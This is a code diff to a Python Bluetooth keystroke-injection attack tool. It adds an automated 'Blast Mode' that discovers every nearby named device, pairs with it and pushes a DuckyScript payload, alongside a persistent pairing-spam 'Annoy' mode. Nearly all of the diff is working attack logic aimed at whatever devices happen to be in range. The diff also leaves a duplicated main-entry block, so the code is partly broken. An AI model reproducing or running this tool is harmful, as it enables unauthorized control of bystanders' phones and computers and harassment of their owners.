@@ -615,25 +615,105 @@ def setup_bluetooth(target_address, adapter_id):
     adapter.power(True)
     return adapter
 
-def initialize_pairing(agent_iface, target_address):
+def perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode, recon_only=False):
+    """Encapsulates the attack logic for a single target."""
     try:
-        with PairingAgent(agent_iface, target_address) as agent:
-            log.debug("Pairing agent initialized")
+        adapter = setup_bluetooth(target_address, adapter_id)
+        adapter.enable_ssp()
+        
+        current_line = 0
+        current_position = 0
+        connection_manager = L2CAPConnectionManager(target_address)
+
+        while True:
+            try:
+                # 1. Connect and initialize pairing
+                hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
+                
+                if recon_only:
+                    log.notice(f"[RECON] Successfully paired with {target_address}. Skipping payload.")
+                    connection_manager.close_all()
+                    return True
+
+                # 2. Deliver Payload
+                process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
+                
+                log.info(f"Payload sent successfully to {target_address}.")
+                time.sleep(2)
+                connection_manager.close_all()
+                return True
+                    
+            except ReconnectionRequiredException as e:
+                log.info(f"Reconnection required for {target_address}...")
+                current_line = e.current_line
+                current_position = e.current_position
+                connection_manager.close_all()
+                time.sleep(2)
+            except Exception as e:
+                if is_annoy_mode:
+                    log.info(f"Connection rejected/failed for {target_address}: {e}. Retrying...")
+                    connection_manager.close_all()
+                    time.sleep(2)
+                else:
+                    log.error(f"Attack failed for {target_address}: {e}")
+                    connection_manager.close_all()
+                    return False
     except Exception as e:
-        log.error(f"Failed to initialize pairing agent: {e}")
-        raise ConnectionFailureException("Pairing agent initialization failed")
+        log.error(f"Critical failure during attack on {target_address}: {e}")
+        return False
 
-def establish_connections(connection_manager):
-    if not connection_manager.connect_all():
-        raise ConnectionFailureException("Failed to connect to all required ports")
+def blast_loop(adapter_id, duckyscript, recon_only=False):
+    """Continuous discovery and automated targeting loop."""
+    print(AnsiColorCode.CYAN + "\n" + "="*50)
+    print(f"B L A S T  M O D E  A C T I V E ({'RECON' if recon_only else 'ATTACK'})")
+    print("="*50 + AnsiColorCode.RESET)
+    print("[!] Monitoring for named devices...")
+    print("[!] Press Ctrl+C to abort Blast Mode.\n")
 
-def setup_and_connect(connection_manager, target_address, adapter_id):
-    connection_manager.create_connection(1)   # SDP
-    connection_manager.create_connection(17)  # HID Control
-    connection_manager.create_connection(19)  # HID Interrupt
-    initialize_pairing(adapter_id, target_address)
-    establish_connections(connection_manager)
-    return connection_manager.clients[19]
+    blasted_devices = set()
+    bus = SystemBus()
+    
+    try:
+        # Start persistent discovery
+        adapter_obj = bus.get("org.bluez", f"/org/bluez/{adapter_id}")
+        adapter_obj.StartDiscovery()
+        
+        while True:
+            mngr = bus.get("org.bluez", "/")
+            objs = mngr.GetManagedObjects()
+            
+            new_targets = []
+            for path, interfaces in objs.items():
+                if "org.bluez.Device1" in interfaces:
+                    props = interfaces["org.bluez.Device1"]
+                    name = props.get("Name", props.get("Alias", None))
+                    addr = path.split('/')[-1].replace('dev_', '').replace('_', ':')
+                    
+                    if name and addr not in blasted_devices and not name.startswith("00-00-00"):
+                        new_targets.append((addr, name))
+
+            for addr, name in new_targets:
+                log.notice(f"\n[BLAST] NEW TARGET FOUND: {name} ({addr})")
+                log.info(f"Initiating {'Recon' if recon_only else 'Attack'} sequence...")
+                
+                success = perform_attack(addr, adapter_id, duckyscript, is_annoy_mode=True, recon_only=recon_only)
+                
+                if success:
+                    log.notice(f"[BLAST] Target {addr} processed successfully.")
+                else:
+                    log.warning(f"[BLAST] Target {addr} skipped or failed.")
+                
+                blasted_devices.add(addr)
+                # Brief cooldown to avoid over-stressing the adapter
+                time.sleep(3)
+            
+            time.sleep(2) # Scan refresh rate
+            
+    except KeyboardInterrupt:
+        print("\n[!] Blast Mode stopped.")
+    finally:
+        try: adapter_obj.StopDiscovery()
+        except: pass
 
 # Main function
 def main():
@@ -643,11 +723,53 @@ def main():
     adapter_id = args.adapter
         
     main_menu()
+    
+    # Check if user wants BLAST mode
+    print("\nSelect Target Mode:")
+    print("1: Single Target (Manual Select)")
+    print("2: Multi-Target Blast (Automated)")
+    target_mode = input("Enter mode (1/2): ").strip()
+
+    if target_mode == "2":
+        # BLAST MODE PATH
+        print("\nSelect Blast Sub-Mode:")
+        print("1: Recon Blast (Pairing Only - Detect Success)")
+        print("2: Attack Blast (Pairing + Automated Payload)")
+        blast_choice = input("Enter sub-mode (1/2): ").strip()
+        recon_only = (blast_choice == "1")
+
+        # Select Payload for Attack Blast
+        duckyscript = None
+        if not recon_only:
+            duckyscript = select_payload()
+            if not duckyscript: return
+        else:
+            duckyscript = [] # Empty for recon
+
+        blast_loop(adapter_id, duckyscript, recon_only=recon_only)
+        return
+
+    # SINGLE TARGET PATH (Original Flow)
     target_address = get_target_address()
     if not target_address:
         log.info("No target address provided. Exiting.")
         return
     
+    duckyscript = select_payload()
+    if not duckyscript:
+        log.info("Payload file not found or selected. Exiting.")
+        return
+
+    print("\nSelect Attack Mode:")
+    print("1: Normal (One-shot payload)")
+    print("2: Annoy (Persistent pairing spam)")
+    mode_choice = input("Enter mode (1/2): ")
+    is_annoy_mode = (mode_choice == "2")
+
+    perform_attack(target_address, adapter_id, duckyscript, is_annoy_mode)
+
+def select_payload():
+    """Helper to list and select payload."""
     script_directory = os.path.dirname(os.path.realpath(__file__))
     payload_folder = os.path.join(script_directory, 'payloads/')  # Specify the relative path to the payloads folder.
     payloads = os.listdir(payload_folder)
@@ -664,57 +786,20 @@ def main():
         selected_payload = os.path.join(payload_folder, payloads[payload_index])
     except (ValueError, IndexError):
         print("Invalid payload choice. No payload selected.")
+        return None
 
     if selected_payload is not None:
         print(f"Selected payload: {selected_payload}")
-        duckyscript = read_duckyscript(selected_payload)
-    else:
-        print("No payload selected.")
+        return read_duckyscript(selected_payload)
+    return None
 
-    
-    if not duckyscript:
-        log.info("Payload file not found. Exiting.")
-        return
-
-    print("\nSelect Attack Mode:")
-    print("1: Normal (One-shot payload)")
-    print("2: Annoy (Persistent pairing spam)")
-    mode_choice = input("Enter mode (1/2): ")
-    is_annoy_mode = (mode_choice == "2")
-
-    adapter = setup_bluetooth(target_address, adapter_id)
-    adapter.enable_ssp()
-    
-    current_line = 0
-    current_position = 0
-    connection_manager = L2CAPConnectionManager(target_address)
-
-    print(f"\n[!] Starting {'ANNOY' if is_annoy_mode else 'NORMAL'} mode...")
-    while True:
-        try:
-            hid_interrupt_client = setup_and_connect(connection_manager, target_address, adapter_id)
-            process_duckyscript(hid_interrupt_client, duckyscript, current_line, current_position)
-            
-            log.info("Payload sent successfully. Exiting.")
-            time.sleep(2)
-            break  # Exit loop regardless of mode once payload is sent
-                
-        except ReconnectionRequiredException as e:
-            log.info("Reconnection required. Attempting to reconnect...")
-            current_line = e.current_line
-            current_position = e.current_position
-            connection_manager.close_all()
-            time.sleep(2)
-        except Exception as e:
-            if is_annoy_mode:
-                log.info(f"Connection rejected/failed: {e}. Retrying in Annoy mode...")
-                connection_manager.close_all()
-                time.sleep(2)
-            else:
-                log.error(f"Fatal error: {e}")
-                break
-            
-    #process_duckyscript(hid_interrupt_client, duckyscript)
+if __name__ == "__main__":
+    setup_logging()
+    log = logging.getLogger(__name__)
+    try:
+        main()
+    finally:
+        terminate_child_processes()
 
 if __name__ == "__main__":
     setup_logging()
